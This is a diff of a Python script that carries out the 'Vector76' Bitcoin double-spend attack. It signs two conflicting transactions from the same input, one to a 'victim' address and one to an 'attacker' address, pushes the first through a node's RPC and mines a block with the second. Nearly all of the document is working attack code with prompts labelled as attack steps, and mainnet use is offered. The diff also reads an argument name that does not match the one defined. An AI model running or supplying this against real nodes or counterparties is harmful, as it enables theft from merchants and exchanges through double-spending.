@@ -1,27 +1,65 @@
 import sys
 import time
 
-import mp3play
 import bitcoin
-import playsound
+import argparse
+import subprocess
 import bitcoin.tests
 import bitcoin.transaction
-import subprocess
 
-from bitcoin_tools.core.transaction import TX
-from bitcoinaddress import Wallet
 from bitcoincli import Bitcoin
+from bitcoinaddress import Wallet
+from bitcoin_tools.core.transaction import TX
 
-#attacker_temp_wallet = Wallet()
-#sk, pk = load_keys(sys.argv[1])
-rpc_host = sys.argv[1]
-rpc_port = int(sys.argv[2])
-username = sys.argv[3]
-password = sys.argv[4]
-key  = sys.argv[5]
-address_attacker      = sys.argv[6]#Wallet(format("064x"))
-address_victim        = sys.argv[7]#Wallet(format("064x"))
-network = sys.argv[8]
+parser = argparse.ArgumentParser(description="How To Use vector76")
+
+parser.add_argument("node_host",
+                    help="Blockchain Node Host",
+                    type=str)
+parser.add_argument("node_port",
+                    help="Blockchain Node Port",
+                    type=int)
+parser.add_argument("username",
+                    help="Node username",
+                    type=str)
+parser.add_argument("password",
+                    help="Node password",
+                    type=str)
+parser.add_argument("attacker_signkey",
+                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
+                    type=str)
+parser.add_argument("victim_address",
+                    help="victim address.",
+                    type=str)
+parser.add_argument("attacker_address",
+                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
+                    type=str)
+parser.add_argument("amount_of_coins",
+                    help="Amount of coins sent. (Enter in BTC units)",
+                    type=float)
+parser.add_argument("prev_deposit_TXID",
+                    help="Last deposit TXID of first attacker address",
+                    type=str)
+parser.add_argument("--network",
+                    help="mainnet or testnet. (Default = testnet)",
+                    type=str,
+                    default="testnet")
+
+def to_satoshi(btc_amount):
+    satoshi = 0.00000001
+    return btc_amount / satoshi
+
+args = parser.parse_args()
+rpc_host = args.node_host
+rpc_port = args.node_port
+username = args.username
+password = args.password
+key      = args.attacker_signkey_1
+victim_address   = args.victim_address
+attacker_address = args.attacker_address
+amount_BTC = args.amount_of_coins#float(sys.argv[9])
+prev_txid  = args.prev_deposit_TXID
+network = args.network
 print(f"[+] {network} Mode.")
 #node_url = "https://bitcoin-mainnet.node.coinapi.io"
 #node_api_key = sys.argv[6]
@@ -30,13 +68,6 @@ print(f"[+] {network} Mode.")
 #  'Content-Type': 'application/json',
 #  'accept': 'application/json'
 #}
-def to_satoshi(btc_amount):
-    satoshi = 0.00000001
-    return btc_amount / satoshi
-
-#Wallet(format("064x"))
-amount_BTC = float(sys.argv[9])
-prev_txid  = sys.argv[10]
 print("Connecting Node...")
 rpc_node = Bitcoin(username, password, rpc_host, rpc_port)
 
@@ -48,14 +79,14 @@ fee_satoshi = 1500
 
 bitcoin.SelectParams(network)
 print("Create T1 rawtx And sign")
-tx_victim = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, address_victim).hex
+tx_victim = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, victim_address).hex
 print(tx_victim)
 tx_victim = bitcoin.transaction.sign(tx_victim, key)
 print()
 print(tx_victim)
 
 print("Create T2 rawtx And sign")
-tx_attacker = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, address_attacker).hex
+tx_attacker = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, attacker_address).hex
 print(tx_attacker)
 tx_attacker = bitcoin.transaction.sign(tx_attacker, key)
 
@@ -65,8 +96,8 @@ print("[+] READY...")
 print(f"Network : {network}")
 print(f"Send Amount (Satoshi) : {amount_satoshi - fee_satoshi}")
 print(f"Mining Fee  (Satoshi) : {fee_satoshi}")
-print(f"Victim   Address      : {address_victim}")
-print(f"Attacker Address      : {address_attacker}")
+print(f"Victim   Address      : {victim_address}")
+print(f"Attacker Address      : {attacker_address}")
 input(" --- Press the enter key to continue the Vector76 attack. --- ")
 print("push T1")
 result = rpc_node.sendrawtransaction(tx_victim)
@@ -78,9 +109,9 @@ print(result)
 print("Mining Vector76 Block...")
 miner_Wallet = Wallet()
 print(" --- Miner Wallet --- ")
-print(address_attacker)
+print(attacker_address)
 print(" -------------------- ")
-vector76_mining_hash = rpc_node.generateblock(f"{address_attacker} [{tx_attacker}]")
+vector76_mining_hash = rpc_node.generateblock(f"{attacker_address} [{tx_attacker}]")
 print()
 print(vector76_mining_hash)
 input("--- Send the block after pressing the enter key. --- ")
@@ -95,6 +126,7 @@ print()
 
 sound_name = "ImagineBreaker.mp3"
 try:
+    import mp3play
     clip = mp3play.load(sound_name)
     clip.play()
     time.sleep(min(5, clip.seconds()))
